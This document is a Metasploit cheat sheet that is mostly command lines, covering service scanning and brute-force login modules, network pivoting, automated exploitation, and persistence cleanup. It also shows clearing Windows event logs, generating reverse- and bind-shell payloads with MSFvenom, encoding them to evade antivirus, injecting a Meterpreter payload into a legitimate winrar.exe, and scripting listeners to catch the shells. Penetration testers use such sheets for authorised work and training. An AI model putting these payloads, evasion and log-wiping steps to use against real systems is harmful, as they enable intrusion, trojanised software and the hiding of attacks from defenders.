
> [!abstract] Metasploit Framework (MSF) Cheat Sheet
> A comprehensive guide for using Metasploit, covering database setup, module types, auxiliary scanning, payload generation (MSFvenom), and automation.

## Initial Setup & Database Configuration

> [!info]+ Database Initialization
> Metasploit uses PostgreSQL to store scan results, credentials, and vulnerabilities. It must be running before starting MSF.
> ```bash
> # Install Metasploit
> sudo apt update && sudo apt install metasploit-framework -y
> 
> # Start and enable PostgreSQL
> sudo service postgresql start
> sudo update-rc.d postgresql enable
> 
> # Initialize the MSF database
> msfdb init
> 
> # Launch MSF console quietly
> msfconsole -q
> ```

> [!tip]+ Workspaces & Database Management
> Workspaces help segregate different targets and engagements.
> ```ruby
> msf> db_status                 # Check database connection
> msf> workspace -a test         # Add a new workspace
> msf> workspace test            # Switch to workspace
> msf> workspace default         # Switch back to default
> 
> # Database Query Commands
> msf> hosts                     # List discovered hosts
> msf> services                  # List discovered services
> msf> vulns                     # List identified vulnerabilities
> msf> creds                     # Show saved credentials
> msf> loot                      # Show downloaded files
> ```

---

## MSF Module Types

> [!example] Core Module Categories
> Metasploit is organized into several types of modules:
> - **Auxiliary:** Used for recon, information gathering, brute-forcing, and scanning (e.g., `auxiliary/scanner/...`).
> - **Exploit:** The actual code used to take advantage of a vulnerability.
> - **Payload:** The code that runs on the target after exploitation (e.g., Meterpreter, reverse shells).
> - **Post:** Post-exploitation modules (persistence, impact, data gathering).
> - **Encoder:** Used to encode payloads to evade AV detection.
> - **NOP:** No-operation generators (used for payload padding/buffer alignment).
> - **Evasion:** Modules specifically designed to generate evasive payloads.

---

## Recon & Enumeration (Auxiliary)

> [!success]+ Nmap Integration
> You can run Nmap directly from MSF or import external XML results.
> ```bash
> # External Nmap to XML, then import
> nmap -Pn -sV -O 94.182.182.2 -oX file.xml
> msfconsole -q
> msf5> workspace -a windowsServer2009
> msf5> db_import file.xml
> ```
> ```ruby
> # Running Nmap directly inside MSF (saves to DB automatically)
> msf5> db_nmap -Pn -sV -O 94.182.182.2
> ```

> [!example]+ Protocol Scanning Modules
> Use auxiliary modules to enumerate specific services.
> 
> **FTP:**
> ```ruby
> msf5> search type:auxiliary name:ftp
> msf5> use auxiliary/scanner/ftp/ftp_version
> msf5> use auxiliary/scanner/ftp/ftp_login
> msf5> use auxiliary/scanner/ftp/anonymous
> ```
> 
> **SMB:**
> ```ruby
> msf5> setg RHOSTS 192.158.32.23  # Set global RHOSTS
> msf5> search type:auxiliary name:smb
> msf5> use auxiliary/scanner/smb/smb_version
> msf5> use auxiliary/scanner/smb/smb_enumusers
> msf5> use auxiliary/scanner/smb/smb_enumshares
> msf5> use auxiliary/scanner/smb/smb_logon
> ```
> 
> **SSH:**
> ```ruby
> msf5> search type:auxiliary name:ssh
> msf5> use auxiliary/scanner/ssh/ssh_version
> msf5> use auxiliary/scanner/ssh/ssh_login
> msf5> use auxiliary/scanner/ssh/ssh_enumusers
> ```
> 
> **HTTP:**
> ```ruby
> msf5> search type:auxiliary name:http
> msf5> use auxiliary/scanner/http/http_version
> msf5> use auxiliary/scanner/http_header
> msf5> use auxiliary/scanner/http_robots.txt
> msf5> use auxiliary/scanner/http_login
> msf6> use auxiliary/scanner/apache_userdir_enum # Find users
> ```
> 
> **MySQL:**
> ```ruby
> msf5> search type:auxiliary name:mysql
> msf5> use auxiliary/scanner/mysql/mysql_version
> msf5> use auxiliary/scanner/mysql/mysql_login
> msf5> use auxiliary/admin/mysql/mysql_enum
> msf5> use auxiliary/admin/mysql/mysql_sql  # Interactive (e.g., show databases;)
> msf5> use auxiliary/scanner/mysql/mysql_schemadump
> ```

> [!warning]+ Pivoting with Autoroute
> After exploiting a host, use it to scan unreachable internal networks.
> ```ruby
> meterpreter> sysinfo
> meterpreter> shell
> /bin/bash -i
> www-data@victim:/home$ ifconfig  # Find internal IP
> exit
> 
> # Add route to internal network through the compromised session
> meterpreter> run autoroute -s 192.168.10.2
> meterpreter> background
> 
> # Now use a port scanner against the hidden network
> msf5> search portscan
> msf5> use 5
> msf5> set RHOSTS 192.168.10.2-90
> ```

---

## Exploitation & Vulnerability Analysis

> [!danger]+ Automated Vulnerability Detection
> Automate target analysis using Nessus imports or the `db_autopwn` plugin.
> 
> **Nessus Import:**
> ```ruby
> msf6> workspace -a test
> msf6> db_import /home/adolf/filexport.nessus
> msf6> vulns -p 445
> msf6> search cve:2017 name:EternalBlue
> ```
> 
> **db_autopwn Plugin:**
> 1. Download from [hahwul/metasploit-autopwn](https://github.com/hahwul/metasploit-autopwn)
> 2. Place the `.rb` file in `/usr/share/metasploit-framework/plugins/`
> ```ruby
> msf6> load db_autopwn
> msf6> db_autopwn -p -t -PI 445
> msf6> analyze
> msf6> vulns
> ```
##  Cleanup

> [!info]+ Removing Persistence & Meterpreter Logs
> When persistence is established using Metasploit (e.g., `persistence_service`), a cleanup resource script is automatically generated. Running this script removes the persistent service and registry keys.
> 
> ```ruby
> # Interact with the active session
> msf6> sessions -i 1
> 
> # Run the auto-generated cleanup script to remove persistence
> meterpreter> resource /root/.msf6/logs/persistence/ATTACKDEFENCE/ATTACKDEFENCE.rc
> 
> # Clear the Windows Application, System, and Security event logs
> meterpreter> clearev
> ```
> *Note: `clearev` clears all event logs, which is a loud action and often alerts defenders that an incident is occurring.*

---

## MSFvenom (Payload Generation)

> [!info]+ Listing Payloads & Formats
> MSFvenom is used to generate standalone payloads and shellcode.
> ```bash
> msfvenom --list payloads
> msfvenom -l payloads --platform windows --arch x86
> msfvenom -l formats
> msfvenom -l encoders
> ```

> [!bug]+ Generating Windows Payloads
> ```bash
> # 32-bit Windows EXE
> msfvenom -a x86 -p windows/meterpreter/reverse_tcp --platform windows LHOST=<IP> LPORT=<PORT> -f exe -o /home/adolf/vir.exe
> 
> # 64-bit Windows EXE
> msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp --platform windows LHOST=<IP> LPORT=<PORT> -f exe > /home/adolf/vir.exe
> 
> # PowerShell Bind Shell
> msfvenom -p windows/x64/shell_bind_tcp --platform windows -f psh-net -o bind_shell.ps1 LPORT=8888
> 
> # DLL Payload
> msfvenom -p windows/x64/shell_bind_tcp --platform windows -f dll -o bind_shell.dll
> ```

> [!bug]+ Generating Linux Payloads
> ```bash
> # 32-bit Linux ELF
> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > /home/adolf/vir.elf
> 
> # 64-bit Linux ELF
> msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > /home/adolf/vir.elf
> ```

> [!danger]+ Encoders & PE Injection
> Encode payloads to evade basic antivirus and inject them into legitimate executables.
> 
> **Encoding Windows Payload:**
> ```bash
> # -e: encoder, -i: iterations
> msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -e x86/shikata_ga_nai -i 3 > /home/adolf/vir.exe
> ```
> 
> **Encoding Linux Payload:**
> ```bash
> msfvenom -p linux/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -e x86/shikata_ga_nai -i 10 > /home/adolf/vir.elf
> chmod +x vir.elf
> ```
> 
> **Injecting into an Existing PE (Executable):**
> ```bash
> # -x: template file, -k: keep original behavior
> msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -e x86/shikata_ga_nai -i 10 -x /home/adolf/desktop/winrar.exe -k > winrar3.exe
> ```

> [!tip]+ Setting up a Listener (Handler)
> Quickly start a multi/handler to catch the reverse shell.
> ```bash
> msfconsole -qx "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LPORT 4444; set LHOST 0.0.0.0; exploit"
> ```

---

## Automation (Resource Scripts)

> [!success]+ Using `.rc` Scripts
> Resource scripts allow you to automate MSF commands and run them at startup.
> 
> **Manual Creation:**
> ```bash
> nano automatic.rc
> ```
> *File contents:*
> ```ruby
> use exploit/multi/handler
> set payload windows/x86/meterpreter/reverse_tcp
> set lhost 172.20.10.1
> set lport 5555
> AutoRunScript post/windows/manage/migrate
> set ExitonSession false
> run -z -j
> ```
> **Running Resource Scripts:**
> ```bash
> # From terminal
> msfconsole -r automatic.rc
> # From inside MSF
> msf5> resource /home/adolf/automatic.rc
> ```
> **Auto-Generating Resource Scripts:**
> If you have a module configured in MSF, you can save its exact state:
> ```ruby
> msf5(exploit/...)> makerc /home/adolf/autos.rc
> ```

